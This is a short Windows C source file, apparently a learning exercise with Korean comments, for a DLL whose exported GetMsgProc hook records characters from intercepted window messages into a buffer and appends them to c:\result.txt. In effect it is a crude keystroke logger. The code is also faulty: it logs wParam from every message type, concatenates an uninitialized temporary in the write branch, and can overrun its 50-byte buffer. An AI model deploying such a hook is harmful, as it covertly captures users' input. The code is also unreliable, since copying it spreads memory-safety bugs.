#include <windows.h>

#define BUFFER_SIZE 50

HINSTANCE hinst;
#define EXPORT __declspec(dllexport)

static char str[BUFFER_SIZE];
static int Max_buf = 50;
static int count = 0;
static BOOL stop = FALSE;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved){
    if( dwReason == DLL_PROCESS_ATTACH)
    {
        hinst = hinstDLL;
        str[0] = 0;

    }
    return TRUE;
}

EXPORT LRESULT CALLBACK GetMsgProc(INT nCode, WPARAM wp, LPARAM lp){
    HFILE hFile;
    long msgTemp;
    char strTemp[2];

    if(nCode >= 0 ){
        msgTemp = ( (MSG*)lp )-> message; // 메시지 가져오기

        if( count < (Max_buf + 2)){
            if( (count ++ ) > 50 ){
                char a[5] = {13, 10, 13, 10, 0}; // CRLF 두번

                hFile = _lopen("c:\\result.txt", OF_READWRITE);

                if( hFile < 0 ){
                    hFile = _lcreat("c:\\result.txt", OF_READWRITE);
                    _llseek(hFile, 0L, FILE_BEGIN);
                }
                else{
                    _llseek(hFile, 0L, FILE_END);
                }

                _lwrite( hFile, a, 5);
                _lwrite( hFile, str, BUFFER_SIZE);
                _lclose( hFile );

                stop = TRUE;

            }else{
                strTemp[0] = ((MSG*)lp) -> wParam;
                strTemp[1] = 0;
            }

            strcat(str, strTemp);
        }
    }

    return (stop)?TRUE:CallNextHookEx(NULL, nCode, wp, lp);
}